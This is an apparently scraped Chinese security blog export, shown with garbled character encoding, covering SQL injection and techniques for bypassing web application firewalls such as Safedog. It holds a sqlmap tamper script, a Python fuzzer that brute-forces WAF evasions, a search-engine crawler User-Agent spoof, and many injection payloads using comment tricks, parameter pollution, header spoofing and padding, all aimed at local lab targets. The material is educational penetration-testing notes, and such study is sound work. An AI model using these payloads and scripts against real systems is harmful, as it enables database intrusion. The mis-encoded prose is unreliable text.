ä¸­å­˜åœ¨ç™½åå•çš„å­—ç¬¦ä¸²ï¼Œå°±ä½œä¸ºç™½åå•ä¸è¿›è¡Œæ£€æµ‹ã€‚å¸¸è§çš„ url æ„é€ å§¿åŠ¿ï¼š 123http://127.0.0.1/sql.php/admin/php?id=1http://127.0.0.1/sql.php?a=/manage/&amp;b=../etc/passwdhttp://127.0.0.1/../../../manage/../sql.asp?id=2 wafé€šè¿‡/manage/è¿›è¡Œæ¯”è¾ƒï¼Œåªè¦urlä¸­å­˜åœ¨/manage/å°±ä½œä¸ºç™½åå•ä¸è¿›è¡Œæ£€æµ‹ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡/sql.php?1=manage/&amp;b=../etc/passwdç»•è¿‡é˜²å¾¡è§„åˆ™ã€‚ çˆ¬è™«ç™½åå•åŸç†ç™¾åº¦é€šè¿‡çˆ¬è™«çš„æ–¹å¼å»æ”¶å½•ç½‘ç«™ï¼Œè€Œä¸ä¼šè®©WAFæ‹¦æˆªï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¼ªé€ ç™¾åº¦çˆ¬è™«çš„æ–¹å¼å»ç»•è¿‡WAFã€‚ å„å¤§æœç´¢å¼•æ“çš„User-AgentUser-Agent1https://www.feiniaomy.com/post/429.html **ç™¾åº¦ ** æœåŠ¡å™¨åœ°å€åœ¨åŒ—äº¬ {city:â€åŒ—äº¬å¸‚â€, province:â€åŒ—äº¬å¸‚â€} 1Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html) è°·æ­Œ æœåŠ¡å™¨åœ°å€åœ¨èŠ’å»·ç»´å°¤ {city:â€èŠ’å»·ç»´å°¤â€, province:â€åŠ åˆ©ç¦å°¼äºšå·â€} 123Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) ä¼ªé€ æˆç™¾åº¦çˆ¬è™«è„šæœ¬å½“æˆ‘ä»¬ä¸ä¼ªé€ ç™¾åº¦çˆ¬è™«æ—¶ï¼Œæˆ‘ä»¬å»æ‰«æç½‘ç«™ï¼Œæ‰«æåˆ°çš„ç»“æœéƒ½ä¼šè¢«æ‹¦æˆªï¼Œæ‰«æç»“æœéƒ½æ˜¯é”™è¯¯çš„ï¼Œè€Œä¼ªé€ ä»¥åå°±ä¸ä¼šè¢«æ‹¦æˆªã€‚ 12345678910111213import jsonimport requestsurl=&#x27;http://192.168.0.103:8080/&#x27;head=&#123; &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#x27;&#125;for data in open(&#x27;PH1P.txt&#x27;): data=data.replace(&#x27;\\n&#x27;,&#x27;&#x27;) urls=url+data code=requests.get(urls).status_code print(urls+&#x27;|&#x27;+str(code)) FUZZç»•è¿‡è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/envpython&quot;&quot;&quot;Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)Seethefile&#x27;LICENSE&#x27;forcopyingpermission&quot;&quot;&quot;import osfrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMSfrom lib.core.enums import PRIORITY__priority__=PRIORITY.HIGHESTdef dependencies(): singleTimeWarnMessage(&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;%(os.path.basename(__file__).split(&quot;.&quot;)[0],DBMS.MYSQL))def tamper(payload,**kwargs): #%23a%0aunion/*!44575select*/1,2,3 if payload: payload=payload.replace(&quot;union&quot;,&quot;%23a%0aunion&quot;) payload=payload.replace(&quot;select&quot;,&quot;/*!44575select*/&quot;) payload=payload.replace(&quot;%20&quot;,&quot;%23a%0a&quot;) payload=payload.replace(&quot;&quot;,&quot;%23a%0a&quot;) payload=payload.replace(&quot;database()&quot;,&quot;database%23a%0a()&quot;) return payloadimport requests,timeurl=&#x27;http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1&#x27;union=&#x27;union&#x27;select=&#x27;select&#x27;num=&#x27;1,2,3&#x27;a=&#123;&#x27;%0a&#x27;,&#x27;%23&#x27;&#125;aa=&#123;&#x27;x&#x27;&#125;aaa=&#123;&#x27;%0a&#x27;,&#x27;%23&#x27;&#125;b=&#x27;/*!&#x27;c=&#x27;*/&#x27;def bypass(): for xiaodi in a: for xiaodis in aa: for xiaodiss in aaa: for two in range(44500,44600): urls=url+xiaodi+xiaodis+xiaodiss+b+str(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiaodiss+num #urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xiaodiss+num try: result=requests.get(urls).text len_r=len(result) if (result.find(&#x27;safedog&#x27;)==-1): #print(&#x27;bypass url addreessï¼š&#x27;+urls+&#x27;|&#x27;+str(len_r)) print(&#x27;bypass url addreessï¼š&#x27;+urls+&#x27;|&#x27;+str(len_r)) if len_r==715: fp = open(&#x27;url.txt&#x27;,&#x27;a+&#x27;) fp.write(urls+&#x27;\\n&#x27;) fp.close() except Exception as err: print(&#x27;connecting error&#x27;) time.sleep(0.1)if__name__==&#x27;__main__&#x27;: print(&#x27;fuzz strat!&#x27;) bypass() SQLMAPç»•è¿‡SQLMAPè‡ªå¸¦1https://blog.csdn.net/qq_34444097/article/details/82717357 è‡ªå·±å†™ä»¿ç…§SQLMAPè‡ªå¸¦çš„æ¥å†™ã€‚ æ‹¦æˆªç›´æ¥é€šè¿‡SQLMAPè·‘ï¼Œæ•°æ®åŒ…çš„user-agentä¼šæ˜¾ç¤ºsqlmapçš„æ ‡å¿— è¿™æ ·å°±ä¼šè¢«WAFæ‹¦æˆª å¯ä»¥çœ‹åˆ°WAFå¼€å¯äº†sqlmapå·¥å…·æ‹¦æˆªï¼Œå°±æ˜¯é€šè¿‡è¯†åˆ«user-agentã€‚ æ›´æ”¹user-agent sqlmapä¸­å¯ä»¥é€šè¿‡â€“random-agentè¿›è¡Œæ›´æ”¹æ•°æ®åŒ…ä¸­çš„User-Agentï¼Œæ¥ç»•è¿‡WAFã€‚ æˆåŠŸæ³¨å…¥ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæ³¨å…¥ è€Œä¸”ä»–æ˜¯æ ¹æ®æˆ‘ä»¬å†™çš„è§„åˆ™è¿›è¡Œæ³¨å…¥çš„ WAFå¼€å¯æµé‡é˜²æŠ¤ å½“WAFå¼€å¯CCé˜²æŠ¤ æˆ‘ä»¬å†æ¬¡æ³¨å…¥ï¼Œå‘ç°è¢«æ‹¦æˆªï¼ŒåŸå› æ˜¯å› ä¸ºsqlmapæ³¨å…¥å¤ªå¿«äº†ï¼Œè¢«WAFæ‹¦æˆªäº† ç»•è¿‡æ–¹æ³• æ·»åŠ ç™½åå•User-Agentå¤´éƒ¨ï¼Œåƒç™¾åº¦çš„ã€è°·æ­Œçš„ 12sqlmapå‚æ•°:--user-agent=&quot;xxxx&quot; è‡ªå®šä¹‰User-Agent ä»£ç†æ±  æ·»åŠ å»¶æ—¶å‚æ•° â€“delayå‚æ•° æ•°æ®åŒ…ä¸­éœ€è¦ä¿®æ”¹çš„sqlmapä¸­æ²¡æœ‰æ—¶: é€šè¿‡è‡ªå·±ç¼–å†™è„šæœ¬äºŒæ¬¡å¼€å‘ã€‚ æ¯”å¦‚è¯´è¿™é‡Œçš„user-agentæ˜¯sqlmapä¸­æ²¡æœ‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å»ä¿®æ”¹ï¼Œç„¶åé€šè¿‡-rçš„æ–¹å¼åœ¨è¿›è¡Œæ³¨å…¥ã€‚ ä¸­è½¬æ³¨å…¥ sqlmapå»æ³¨å…¥æœ¬åœ°çš„è„šæœ¬åœ°å€ -&gt; æœ¬åœ°æ­å»ºè„šæœ¬(è¯·æ±‚æ•°æ®åŒ…è‡ªå®šä¹‰ç¼–å†™) -&gt; è¿œç¨‹åœ°å€","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"18WEBæ¼æ´--SQLæ³¨å…¥ä¹‹å †å åŠWAFç»•è¿‡æ³¨å…¥","slug":"18WEBæ¼æ´-SQLæ³¨å…¥ä¹‹å †å åŠWAFç»•è¿‡æ³¨å…¥","date":"2021-09-21T02:30:05.000Z","updated":"2021-09-21T06:05:10.036Z","comments":true,"path":"2021/09/21/18WEBæ¼æ´-SQLæ³¨å…¥ä¹‹å †å åŠWAFç»•è¿‡æ³¨å…¥/","link":"","permalink":"https://al0nez.github.io/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€åœ¨å®é™…çš„æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œç»å¸¸ä¼šç¢°åˆ°ç½‘ç«™å­˜åœ¨WAFçš„æƒ…å†µã€‚ç½‘ç«™å­˜åœ¨WAFï¼Œæ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨å®‰å…¨å·¥å…·å¯¹ç½‘ç«™è¿›è¡Œæµ‹è¯•ï¼Œå› ä¸ºä¸€æ—¦è§¦ç¢°äº†WAFçš„è§„åˆ™ï¼Œè½»åˆ™ä¸¢å¼ƒæŠ¥æ–‡ï¼Œé‡åˆ™æ‹‰é»‘IPã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è¿›è¡ŒWAFçš„ç»•è¿‡ï¼Œè€Œç»•è¿‡WAFå‰è‚¯å®šéœ€è¦å¯¹WAFçš„å·¥ä½œåŸç†æœ‰ä¸€å®šçš„ç†è§£ã€‚ å †å æŸ¥è¯¢æ³¨å…¥å®šä¹‰Stacked injections(å †å æ³¨å…¥)ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å † sql è¯­å¥(å¤šæ¡)ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå® çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„, æˆ‘ä»¬çŸ¥é“åœ¨ mysql ä¸­, ä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­, æ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚ è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åš stacked injectionã€‚ åŸç†åœ¨mysqlä¸­ï¼›ä»£è¡¨çš„æ˜¯ä¸€ä¸ªè¯­å¥çš„ç»“æŸï¼Œå †å æ³¨å…¥å°±æ˜¯åˆ©ç”¨ï¼›ä½¿å‰ä¸€ä¸ªè¯­å¥ç»“æŸï¼Œç„¶ååé¢è·Ÿä¸Šæˆ‘ä»¬è‡ªå·±çš„è¯­å¥ï¼Œå°±å½¢æˆäº†å †å æ³¨å…¥ã€‚ å±€é™æ€§å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° APIæˆ–è€…æ•°æ®åº“å¼•æ“ ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚ ä¾‹å­1http://127.0.0.1/Less-38/?id=1 æ’å…¥ä¸€ä¸ªç”¨æˆ· 1http://127.0.0.1/Less-38/?id=1&#x27;;insert into users values(100,&#x27;test&#x27;,&#x27;test&#x27;)--+ åŸºç¡€çŸ¥è¯†1https://www.cnblogs.com/sunny11/p/14438269.html å¤§å°å†™/å…³é”®å­—æ›¿æ¢1234567891011id=1UnIoN/**/SeLeCT1,user()Hex() bin() ç­‰ä»·äº ascii()Sleep() ç­‰ä»·äº benchmark()Mid() substring() ç­‰ä»·äºsubstr()@@user ç­‰ä»·äº User()@@Version ç­‰ä»·äº version() å„ç§ç¼–ç 1å¤§å°å†™ï¼ŒURLï¼Œhexï¼Œ%0Aç­‰ æ³¨é‡Šä½¿ç”¨1//----+#//+:%00/!/ç­‰ å†æ¬¡å¾ªç¯1union==uunionnion ç­‰ä»·æ›¿æ¢1user()=@@user()and=&amp;or=|ascii=hexç­‰ å‚æ•°æ±¡æŸ“1?id=1&amp;id=2&amp;id=3 ç¼–ç è§£ç åŠåŠ å¯†è§£å¯†1234s-&gt;%73-&gt;%25%37%33hex,unlcode,base64ç­‰ æ›´æ”¹è¯·æ±‚æäº¤æ–¹å¼123GET POST COOKIEç­‰POST-&gt;multipart/form-data WAFç»•è¿‡-æ•°æ®åº“ç‰¹æ€§MysqlæŠ€å·§ ï¼ˆ1ï¼‰mysqlæ³¨é‡Šç¬¦æœ‰ä¸‰ç§ï¼š#ã€/â€¦/ã€â€“â€¦(æ³¨æ„â€“åé¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œæˆ–è€…ä¸ºâ€“+) ï¼ˆ2ï¼‰ç©ºæ ¼ç¬¦:[0x09,0x0a-0x0d,0x20,0xa0] ï¼ˆ3ï¼‰ç‰¹æ®Šç¬¦å·ï¼š%aæ¢è¡Œç¬¦ å¯ç»“åˆæ³¨é‡Šç¬¦ä½¿ç”¨%23%0aï¼Œ%2d%2d%0aã€‚ ï¼ˆ4ï¼‰å†…è”æ³¨é‡Šï¼š /!UnIon12345SelEcT/1,user()//æ•°å­—èŒƒå›´1000-50540 ï¼ˆ5ï¼‰mysqlé»‘é­”æ³• select{xusername}from{x11test.admin}; SQLServeræŠ€å·§ ï¼ˆ1ï¼‰ç”¨æ¥æ³¨é‡Šæ‰æ³¨å…¥åæŸ¥è¯¢çš„å…¶ä½™éƒ¨åˆ†ï¼š 1/* Cè¯­è¨€é£æ ¼æ³¨é‡Š SQLæ³¨é‡Š 1;00ï¼…ç©ºå­—èŠ‚ ï¼ˆ2ï¼‰ç©ºç™½ç¬¦ï¼š[0x01-0x20] ï¼ˆ3ï¼‰ç‰¹æ®Šç¬¦å·ï¼š%3aå†’å· 1id=1union:select1,2from:admin ï¼ˆ4ï¼‰å‡½æ•°å˜å½¢ï¼šå¦‚db_name ç©ºç™½å­—ç¬¦ 3ã€OracleæŠ€å·§ æ³¨é‡Šç¬¦ï¼šâ€“ã€/**/ ç©ºç™½å­—ç¬¦ï¼š[0x00,0x09ï¼Œ0x0a-0x0d,0x20] 4.é…åˆFUZZï¼ˆSQLI FUZZå­—å…¸ï¼ŒSQLæ³¨å…¥è¿‡æ»¤å…³é”®å­—çš„Fuzzå­—å…¸ï¼‰ å°±æ˜¯æ¨¡ç³Šæµ‹è¯•ï¼Œæ‰¹é‡æµ‹è¯• 1select * from admin where id=1ã€ä½ç½®ä¸€ã€‘unionã€ä½ç½®äºŒã€‘selectã€ä½ç½®ä¸‰ã€‘1,2,db_name()ã€ä½ç½®å››ã€‘fromã€ä½ç½®äº”ã€‘admin WAFç»•è¿‡-é€»è¾‘å±‚é€»è¾‘é—®é¢˜ äº‘wafé˜²æŠ¤ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šå°è¯•é€šè¿‡æŸ¥æ‰¾ç«™ç‚¹çš„çœŸå®IPï¼Œä»è€Œç»•è¿‡CDNé˜²æŠ¤ã€‚ å½“æäº¤GETã€POSTåŒæ—¶è¯·æ±‚æ—¶ï¼Œè¿›å…¥POSTé€»è¾‘ï¼Œè€Œå¿½ç•¥äº†GETè¯·æ±‚çš„æœ‰å®³å‚æ•°è¾“å…¥,å¯å°è¯•Bypassã€‚ HTTPå’ŒHTTPSåŒæ—¶å¼€æ”¾æœåŠ¡ï¼Œæ²¡æœ‰åšHTTPåˆ°HTTPSçš„å¼ºåˆ¶è·³è½¬ï¼Œå¯¼è‡´HTTPSæœ‰WAFé˜²æŠ¤ï¼ŒHTTPæ²¡æœ‰é˜²æŠ¤ï¼Œç›´æ¥è®¿é—®HTTPç«™ç‚¹ç»•è¿‡é˜²æŠ¤ã€‚ ï¼ˆ4ï¼‰ç‰¹æ®Šç¬¦å·%00ï¼Œéƒ¨åˆ†wafé‡åˆ°%00æˆªæ–­ï¼Œåªèƒ½è·å–åˆ°å‰é¢çš„å‚æ•°ï¼Œæ— æ³•è·å–åˆ°åé¢çš„æœ‰å®³å‚æ•°è¾“å…¥ï¼Œä»è€Œå¯¼è‡´Bypassã€‚æ¯”å¦‚ï¼šid=1 %00 and 1=2 union select 1,2,column_name from information_schema.columns æ€§èƒ½é—®é¢˜ çŒœæƒ³1ï¼šåœ¨è®¾è®¡WAFç³»ç»Ÿæ—¶ï¼Œè€ƒè™‘è‡ªèº«æ€§èƒ½é—®é¢˜ï¼Œå½“æ•°æ®é‡è¾¾åˆ°ä¸€å®šå±‚çº§ï¼Œä¸æ£€æµ‹è¿™éƒ¨åˆ†æ•°æ®ã€‚åªè¦ä¸æ–­çš„å¡«å……æ•°æ®ï¼Œå½“æ•°æ®è¾¾åˆ°ä¸€å®šæ•°ç›®ä¹‹åï¼Œæ¶æ„ä»£ç å°±ä¸ä¼šè¢«æ£€æµ‹äº†ã€‚ çŒœæƒ³2ï¼šä¸å°‘WAFæ˜¯Cè¯­è¨€å†™çš„ï¼Œè€ŒCè¯­è¨€è‡ªèº«æ²¡æœ‰ç¼“å†²åŒºä¿æŠ¤æœºåˆ¶ï¼Œå› æ­¤å¦‚æœWAFåœ¨å¤„ç†æµ‹è¯•å‘é‡æ—¶è¶…å‡ºäº†å…¶ç¼“å†²åŒºé•¿åº¦å°±ä¼šå¼•å‘bugï¼Œä»è€Œå®ç°ç»•è¿‡ã€‚ ä¾‹å­1ï¼š 123?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9PSï¼š0xA*1000æŒ‡0xAåé¢â€A&quot;é‡å¤1000æ¬¡ï¼Œä¸€èˆ¬æ¥è¯´å¯¹åº”ç”¨è½¯ä»¶æ„æˆç¼“å†²åŒºæº¢å‡ºéƒ½éœ€è¦è¾ƒå¤§çš„æµ‹è¯•é•¿åº¦ï¼Œè¿™é‡Œ1000åªåšå‚è€ƒä¹Ÿè®¸åœ¨æœ‰äº›æƒ…å†µä¸‹å¯èƒ½ä¸éœ€è¦è¿™ä¹ˆé•¿ä¹Ÿèƒ½æº¢å‡ºã€‚ ä¾‹å­2ï¼š 12345678910111213?a0=0&amp;a1=1&amp;.....&amp;a100=100&amp;id=1unionselect1,schema_name,3fromINFORMATION_SCHEMA.schemataå¤‡æ³¨ï¼šè·å–è¯·æ±‚å‚æ•°ï¼Œåªè·å–å‰100ä¸ªå‚æ•°ï¼Œç¬¬101ä¸ªå‚æ•°å¹¶æ²¡æœ‰è·å–åˆ°ï¼Œå¯¼è‡´SQLæ³¨å…¥ç»•è¿‡ã€‚ ç™½åå• æ–¹å¼ä¸€ï¼šIPç™½åå• ä»ç½‘ç»œå±‚è·å–çš„ipï¼Œè¿™ç§ä¸€èˆ¬ä¼ªé€ ä¸æ¥ï¼Œå¦‚æœæ˜¯è·å–å®¢æˆ·ç«¯çš„IPï¼Œè¿™æ ·å°±å¯èƒ½å­˜åœ¨ä¼ªé€ IPç»•è¿‡çš„æƒ…å†µã€‚ æµ‹è¯•æ–¹æ³•ï¼š 1234567ä¿®æ”¹httpçš„headeræ¥bypasswafX-forwarded-forX-remote-IPX-originating-IPx-remote-addrX-Real-ip æ–¹å¼äºŒï¼šé™æ€èµ„æº ç‰¹å®šçš„é™æ€èµ„æºåç¼€è¯·æ±‚ï¼Œå¸¸è§çš„é™æ€æ–‡ä»¶(.js.jpg.swf.cssç­‰ç­‰)ï¼Œç±»ä¼¼ç™½åå•æœºåˆ¶ï¼Œwafä¸ºäº†æ£€æµ‹æ•ˆç‡ï¼Œä¸å»æ£€æµ‹è¿™æ ·ä¸€äº›é™æ€æ–‡ä»¶ååç¼€çš„è¯·æ±‚ã€‚ 123http://10.9.9.201/sql.php?id=1http://10.9.9.201/sql.php/1.js?id=1 å¤‡æ³¨ï¼šAspx/phpåªè¯†åˆ«åˆ°å‰é¢çš„.aspx/.phpåé¢åŸºæœ¬ä¸è¯†åˆ« æ–¹å¼ä¸‰ï¼šurlç™½åå• ä¸ºäº†é˜²æ­¢è¯¯æ‹¦ï¼Œéƒ¨åˆ†wafå†…ç½®é»˜è®¤çš„ç™½åå•åˆ—è¡¨ï¼Œå¦‚admin/manager/systemç­‰ç®¡ç†åå°ã€‚åªè¦urlä¸­å­˜åœ¨ç™½åå•çš„å­—ç¬¦ä¸²ï¼Œå°±ä½œä¸ºç™½åå•ä¸è¿›è¡Œæ£€æµ‹ã€‚å¸¸è§çš„urlæ„é€ å§¿åŠ¿ WAFåŠç»•è¿‡æ€è·¯å®‰å…¨ç‹—å®‰è£…1https://www.vulner.me/docs/install-safedog/ SQLç»•è¿‡åŸºç¡€çŸ¥è¯† éƒ¨åˆ†bypass sqlinject payload 123id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23 id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23 123id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23 id=-1%20union%20/*!44509select*/%201,2,3%23 /*!44509select*/å½“æ•°æ®åº“ç‰ˆæœ¬æ˜¯4.45.09ä»¥ä¸Šç‰ˆæœ¬å°±ä¼šæ‰§è¡Œ/*! .... */ ä¸­çš„è¯­å¥ï¼Œå¦åˆ™ä¸ä¼šæ‰§è¡Œï¼Œè€Œå¦‚æœæ²¡æœ‰44509`/*!select*/`å°±åªèƒ½æ˜¯æ³¨é‡Šã€‚ 1234567id=1/**&amp;id=-1%20union%20select%201,2,3%23*/ %20æ˜¯ç©ºæ ¼ï¼Œ%23æ˜¯#è¿™æ¡è¯­å¥å°±æ˜¯:id=1/**&amp;id=-1 union select 1,2,3#*/ /***/ä»£è¡¨æ³¨é‡Šçš„æ„æ€,è€Œåœ¨apacheä¸­å¦‚æœä¸€ä¸ªå˜é‡æ¥æ”¶2ä¸ªå‚æ•°,æœ€åçš„é‚£ä¸ªå‚æ•°å°±æ˜¯æœ€åçš„ç»“æœï¼Œå°±ç›¸å½“äºid=1/**å’Œid=-1%20union%20select%201,2,3%23*/ æ¥æ”¶äº†åè€…Mè¿™é‡Œåˆ©ç”¨äº†å‚æ•°æ±¡æŸ“ã€‚ç­‰ä»·sqlè¯­å¥:select * from users where id=-1 union select 1,2,3#*/ 12345678910id=-1 %20union%20all%23%0a%20select%201,2,3%23 id=-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23 /**/æ³¨é‡Šç¬¦ä¸å½±å“%230%0A ==#0æ¢è¡Œç›¸å½“äº:id=-1 union all# select 1,#0 database/**/(),3# æœ€åæ‰§è¡Œç»“æœå°±æ˜¯id=-1 union all select 1,database/**/(),3# åŠ ä¸åŠ alléƒ½ä¸€æ · æ³¨å…¥æäº¤æ–¹å¼ç»•è¿‡WAF å¦‚æœæˆ‘ä»¬çš„å‚æ•°æ˜¯é€šè¿‡REQUESTè¿›è¡Œæ¥æ”¶çš„ï¼Œè€ŒWAFé€šè¿‡æ£€æµ‹GETçš„æ–¹å¼è¿›è¡Œé˜²æŠ¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡POSTçš„æ–¹å¼æäº¤æ•°æ®ï¼Œä»è€Œç»•è¿‡WAF æˆ‘ä»¬æµ‹è¯•å‘ç°æˆåŠŸç»•è¿‡ é€šè¿‡æ³¨é‡Šç¬¦ç»•è¿‡ 1/**/å’Œ/***/éƒ½æ˜¯æ³¨é‡Šç¬¦ï¼Œéƒ½å¯ä»¥ç”¨æ¥æ³¨é‡Šã€‚ä»–ä»¬çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚ é€šè¿‡åŠ å…¥æ³¨é‡Šç¬¦ï¼Œä¸å½±å“sqlè¯­å¥ï¼Œè¾¾åˆ°ç»•è¿‡çš„ç›®çš„ã€‚ httpå‚æ•°æ±¡æŸ“ åœ¨ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯å¾€å¾€ä¼šåœ¨GET/POSTè¯·æ±‚ä¸­å¸¦ä¸Šå‚æ•°ã€‚é€šå¸¸åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­ï¼ŒåŒåå‚æ•°åªä¼šå‡ºç°ä¸€æ¬¡ï¼Œä½†æ˜¯åœ¨HTTPåè®®ä¸­æ˜¯å…è®¸åŒåå‚æ•°å¤šæ¬¡å‡ºç°çš„ã€‚ ä»¥ä¸Šå›¾æœåŠ¡å™¨ä¸ºä¾‹å‡è®¾è¯·æ±‚ä¸ºindex.php?id=1&amp;id=2ï¼Œå®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆé€šè¿‡tomcatè§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥tomcatå»è¯·æ±‚apacheæœåŠ¡å™¨ï¼Œè€Œapacheè§£ææœ€åä¸€ä¸ªå‚æ•°ã€‚å®é™…æä¾›æœåŠ¡çš„æ˜¯apacheæœåŠ¡å™¨ï¼Œå› æ­¤è¿”å›å®¢æˆ·ç«¯çš„æ˜¯id=2ã€‚ WebæœåŠ¡å™¨ å‚æ•°è·å–å‡½æ•° è·å–åˆ°çš„å‚æ•° PHP/Apache $_GET(â€œparâ€) Last JSP/Tomcat Request.getParameter(â€œparâ€) First Perl(CGI)/Apache Param(â€œparâ€) First Python/Apache Getvalue(â€œparâ€) All(List) ASP/IIS Request.QueryString(â€œparâ€) All(comma-delimited string) å¯ä»¥çœ‹åˆ°apacheæœ€åæ¥æ”¶åˆ°äº†3ã€‚ æ¶‰åŠèµ„æºï¼š123https://www.cnblogs.com/backlion/p/9721687.htmlhttps://blog.csdn.net/nzjdsds/article/details/93740686","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"17WEBæ¼æ´--SQLæ³¨å…¥ä¹‹äºŒæ¬¡ã€åŠ è§£å¯†ã€DNSç­‰æ³¨å…¥","slug":"17WEBæ¼æ´-SQLæ³¨å…¥ä¹‹äºŒæ¬¡ã€åŠ è§£å¯†ã€DNSç­‰æ³¨å…¥","date":"2021-09-21T02:29:49.000Z","updated":"2021-09-21T06:05:14.335Z","comments":true,"path":"2021/09/21/17WEBæ¼æ´-SQLæ³¨å…¥ä¹‹äºŒæ¬¡ã€åŠ è§£å¯†ã€DNSç­‰æ³¨å…¥/","link":"","permalink":"https://al0nez.github.io/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† åŠ è§£å¯†åŸç†å°†å‚æ•°é€šè¿‡base64æˆ–è€…å…¶ä»–æ–¹å¼è¿›è¡ŒåŠ å¯†ï¼Œç„¶åè¿›è¡Œä¼ è¾“ï¼Œåœ¨é€šè¿‡åç«¯è¿›è¡Œè§£å¯†ã€‚ ä¾‹å­1http://127.0.0.1/sqli/Less-21/ 1Cookie: uname=YWRtaW4%3D; cookieå­˜åœ¨åŠ å¯†YWRtaW4%3Dï¼Œbase64è½¬æ¢ä¸ºadminï¼Œæ‰€æœ‰æˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬çš„æ³¨å…¥é€šè¿‡base64åŠ å¯†ä¼ è¾“è¿‡å»å°±okäº†ã€‚ 